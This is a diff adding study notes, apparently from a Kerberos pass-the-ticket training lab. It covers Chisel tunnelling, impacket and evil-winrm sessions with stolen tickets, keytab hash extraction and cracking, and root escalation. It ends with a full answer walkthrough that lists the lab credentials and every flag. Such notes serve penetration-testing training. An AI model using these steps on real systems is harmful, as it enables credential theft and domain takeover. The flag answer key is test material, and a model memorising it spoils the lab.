@@ -298,3 +298,402 @@ root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
 **Note:** klist displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. `ccache files` are temporary. They may change or expire if the user no longer uses them or during login and logout operations.
 
 ## Using Linux attack tools with Kerberos
+Many Linux attack tools that interact with Windows and Active Directory support Kerberos authentication. If we use them from a domain-joined machine, we need to ensure our `KRB5CCNAME` environment variable is set to the ccache file we want to use.
+
+In this scenario, our attack host doesn't have a connection to the `KDC/Domain Controller`, and we can't use the Domain Controller for name resolution. To use Kerberos, we need to proxy our traffic via `MS01` with a tool such as [Chisel](https://github.com/jpillora/chisel) and [Proxychains](https://github.com/haad/proxychains) and edit the `/etc/hosts` file to hardcode IP addresses of the domain and the machines we want to attack.
+#### Host file modified
+```shell
+> cat /etc/hosts
+
+# Host addresses
+
+172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
+172.16.1.5  ms01.inlanefreight.htb  ms01
+```
+
+We need to modify our proxychains configuration file to use socks5 and port 1080.
+
+#### Proxychains configuration file
+```shell
+cat /etc/proxychains.conf
+
+...SNIP...
+
+[ProxyList]
+socks5 127.0.0.1 1080
+```
+
+We must download and execute [chisel](https://github.com/jpillora/chisel) on our attack host.
+#### Download Chisel to our attack host
+```shell
+> wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+> gzip -d chisel_1.7.7_linux_amd64.gz
+> mv chisel_* chisel && chmod +x ./chisel
+> sudo ./chisel server --reverse 
+
+2022/10/10 07:26:15 server: Reverse tunneling enabled
+2022/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
+2022/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
+```
+
+Connect to `MS01` via RDP and execute chisel (located in C:\Tools).
+
+#### Connect to MS01 with xfreerdp
+```shell
+> xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
+```
+
+#### Execute chisel from MS01
+```cmd
+C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
+
+2022/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
+2022/10/10 06:34:20 client: Connected (Latency 125.6177ms)
+```
+
+**Note:** The client IP is your attack host IP.
+
+Finally, we need to transfer Julio's ccache file from `LINUX01` and create the environment variable `KRB5CCNAME` with the value corresponding to the path of the ccache file.
+
+#### Setting the KRB5CCNAME environment variable
+```shell
+export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
+```
+
+### Impacket
+To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option `-k`. If we get a prompt for a password, we can also include the option `-no-pass`.
+
+#### Using Impacket with proxychains and Kerberos authentication
+```shell
+proxychains impacket-wmiexec dc01 -k
+
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.14
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
+[*] SMBv3.0 dialect used
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:135  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:50713  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+inlanefreight\julio
+```
+
+**Note:** If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.
+
+### Evil-WinRM
+To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, we need to install the Kerberos package used for network authentication. For some Linux like Debian-based (Parrot, Kali, etc.), it is called `krb5-user`. While installing, we'll get a prompt for the Kerberos realm. Use the domain name: `INLANEFREIGHT.HTB`, and the KDC is the `DC01`.
+
+#### Installing Kerberos authentication package
+#### Default Kerberos v5 realm
+![[Pasted image 20251009142119.png]]
+The Kerberos servers can be empty.
+
+#### Administrative server for your Kerberos realm
+![[Pasted image 20251009142134.png]]
+In case the package `krb5-user` is already installed, we need to change the configuration file `/etc/krb5.conf` to include the following values:
+
+#### Kerberos configuration file for INLANEFREIGHT.HTB
+```shell
+> cat /etc/krb5.conf
+
+[libdefaults]
+        default_realm = INLANEFREIGHT.HTB
+
+...SNIP...
+
+[realms]
+    INLANEFREIGHT.HTB = {
+        kdc = dc01.inlanefreight.htb
+    }
+
+...SNIP...
+```
+Now we can use evil-winrm.
+
+#### Using Evil-WinRM with Kerberos
+```shell
+> proxychains evil-winrm -i dc01 -r inlanefreight.htb
+
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.14
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions are disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:5985  ...  OK
+*Evil-WinRM* PS C:\Users\julio\Documents> whoami ; hostname
+inlanefreight\julio
+DC01
+```
+
+## Miscellaneous
+If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them. To use it, we specify the file we want to convert and the output filename. Let's convert Julio's ccache file to kirbi.
+
+#### Impacket Ticket converter
+```shell
+> impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] converting ccache to kirbi...
+[+] done
+```
+We can do the reverse operation by first selecting a `.kirbi file`. Let's use the `.kirbi` file in Windows.
+
+#### Importing converted ticket into Windows session with Rubeus
+```cmd
+C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
+```
+```cmd
+C:\htb> klist
+
+Current LogonId is 0:0x31adf02
+
+Cached Tickets: (1)
+
+#0>     Client: julio @ INLANEFREIGHT.HTB
+        Server: krbtgt/INLANEFREIGHT.HTB @ INLANEFREIGHT.HTB
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0xa1c20000 -> reserved forwarded invalid renewable initial 0x20000
+        Start Time: 10/10/2022 5:46:02 (local)
+        End Time:   10/10/2022 15:46:02 (local)
+        Renew Time: 10/11/2022 5:46:02 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+
+C:\htb>dir \\dc01\julio
+ Volume in drive \\dc01\julio has no label.
+ Volume Serial Number is B8B3-0D72
+
+ Directory of \\dc01\julio
+
+07/14/2022  07:25 AM    <DIR>          .
+07/14/2022  07:25 AM    <DIR>          ..
+07/14/2022  04:18 PM                17 julio.txt
+```
+
+
+## Linikatz
+[Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a tool created by Cisco's security team for exploiting credentials on Linux machines when there is an integration with Active Directory. In other words, Linikatz brings a similar principle to `Mimikatz` to UNIX environments.
+Just like `Mimikatz`, to take advantage of Linikatz, we need to be root on the machine. This tool will extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc.
+
+```shell-session
+/opt/linikatz.sh
+```
+
+
+
+## Question
+Target ip: 10.129.204.23
+User: david@inlanefreight.htb
+Pass: Password2
+
+1. Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory.
+```shell
+Connect to target with ssh:
+> ssh david@inlanefreight.htb@10.129.204.23 -p 2222
+> 
+ssh > cat flag.txt
+Gett1ng_Acc3$$_to_LINUX01
+```
+
+2. Which group can connect to LINUX01?
+```shell
+> realm list
+inlanefreight.htb
+  type: kerberos
+  realm-name: INLANEFREIGHT.HTB
+  domain-name: inlanefreight.htb
+  configured: kerberos-member
+  server-software: active-directory
+  client-software: sssd
+  required-package: sssd-tools
+  required-package: sssd
+  required-package: libnss-sss
+  required-package: libpam-sss
+  required-package: adcli
+  required-package: samba-common-bin
+  login-formats: %U@inlanefreight.htb
+  login-policy: allow-permitted-logins
+  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
+  permitted-groups: Linux Admins
+  
+  Answer: Linux Admins
+```
+
+3. Look for a keytab file that you have read and write access. Submit the file name as a response.
+```shell
+> for i in $(find / -name *keytab* -type f 2>/dev/null) ; do ls -la $i ; done ;
+
+-rw-r--r-- 1 root root 2110 Aug  9  2021 /usr/lib/python3/dist-packages/samba/tests/dckeytab.py
+-rw-r--r-- 1 root root 1871 Oct  4  2022 /usr/lib/python3/dist-packages/samba/tests/__pycache__/dckeytab.cpython-38.pyc
+-rw-r--r-- 1 root root 22768 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/ldb/update_keytab.so
+-rw-r--r-- 1 root root 26856 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/libnet-keytab.so.0
+-rw------- 1 root root 2694 Oct  9 12:42 /etc/krb5.keytab
+-rw-r--r-- 1 root root 10015 Oct  4  2022 /opt/impacket/impacket/krb5/keytab.py
+-rw-rw-rw- 1 root root 216 Oct  9 12:45 /opt/specialfiles/carlos.keytab
+-rw-r--r-- 1 root root 4582 Oct  6  2022 /opt/keytabextract.py
+-rw-r--r-- 1 root root 380 Oct  4  2022 /var/lib/gems/2.7.0/doc/gssapi-1.3.1/ri/GSSAPI/Simple/set_keytab-i.ri
+
+We see that we have read/write perm on: /opt/specialfiles/carlos.keytab
+
+Answer: carlos.keytab
+```
+
+4. Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory.
+```shell
+> python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+	REALM : INLANEFREIGHT.HTB
+	SERVICE PRINCIPAL : carlos/
+	NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
+	AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
+	AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
+	
+Crack the NTLM Hash with crackstation:
+Password of carlos: Password5 
+
+> su - carlos@inlanefreight.htb
+password:
+
+carlos > cat flag.txt
+C@rl0s_1$_H3r3
+```
+
+5.  Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory.
+
+```shell
+As carlos user:
+> crontab -l
+*/5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
+
+> cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
+
+
+----
+#!/bin/bash
+kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
+smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
+----
+
+> ls -la /home/carlos@inlanefreight.htb/.scripts/
+-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  246 Oct  9 12:55 svc_workstations._all.kt
+-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb   94 Oct  9 12:55 svc_workstations.kt
+
+This keytab does not contain NTLM hash after verification but svc_workstations._all.kt does have a NTML hash inside:
+
+> python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+	REALM : INLANEFREIGHT.HTB
+	SERVICE PRINCIPAL : svc_workstations/
+	NTLM HASH : 7247e8d4387e76996ff3f18a34316fdd
+	AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
+	AES-128 HASH : 3a7e52143531408f39101187acc80677
+	
+Crack hash with crackstation:
+Password of svc_workstations: Password4
+
+Connect as svc_workstations on target with ssh:
+> ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
+Password:
+
+svc_workstations@inlanefreight.htb@linux01:~$ cat flag.txt
+Mor3_4cce$$_m0r3_Pr1v$
+```
+
+6. Check the sudo privileges of the svc_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response.
+```shell
+Escalate privilege:
+svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
+
+User svc_workstations@inlanefreight.htb may run the following commands on linux01:
+    (ALL) ALL
+    
+svc_workstations@inlanefreight.htb@linux01:~$ sudo su
+root@linux01:/home/svc_workstations@inlanefreight.htb
+
+
+As root:
+> cat /root/flag.txt
+Ro0t_Pwn_K3yT4b
+```
+
+7. Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio.
+```shell
+> ls -la /tmp
+-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1414 Oct  9 13:00 krb5cc_647401106_EmHFRF
+-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  9 13:00 krb5cc_647401106_HRJDux
+
+This is the 2 Julio tickets.
+Try first one:
+> cp /tmp/krb5cc_647401106_HRJDux .
+> export KRB5CCNAME=/root/krb5cc_647401106_HRJDux
+> klist
+> smbclient //dc01/julio -k -no-pass
+This result as an error ! Try the second ticket !
+Same process but second tickets then smblient:
+
+> smbclient //dc01/julio -k -no-pass
+smb: \> get julio.txt
+
+> cat julio.txt
+JuL1()_SH@re_fl@g
+```
+
+8. Use the LINUX01$ Kerberos ticket to read the flag found in \\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_).
+```shell
+So we can try to find keytab again because we have high permissions:
+> find / -name *keytab* 2>/dev/null
+...
+/etc/krb5.keytab
+...
+
+> python3 /opt/keytabextract.py /etc/krb5.keytab
+NTLM HASH : 5aa7d65408b1c36bb2d0892b8e53bce8
+Not crackable
+Let's impersonate user LINUX01$
+> klist -k -t /etc/krb5.keytab
+Keytab name: FILE:/etc/krb5.keytab
+KVNO Timestamp           Principal
+---- ------------------- ------------------------------------------------------
+   2 10/04/2022 16:26:55 LINUX01$@INLANEFREIGHT.HTB
+   2 10/04/2022 16:26:55 LINUX01$@INLANEFREIGHT.HTB
+   
+
+>  kinit 'LINUX01$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab
+>  klist
+Ticket cache: FILE:/root/krb5cc_647401106_Mhqibk
+Default principal: LINUX01$@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+10/09/2025 13:53:44  10/09/2025 23:53:44  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+	renew until 10/10/2025 13:53:44
+	
+Now we can list share of LINUX01
+
+> smbclient //dc01/linux01 -k  -no-pass
+Get flag
+
+> cat flag.txt
+Us1nG_KeyTab_Like_@_PRO
+```
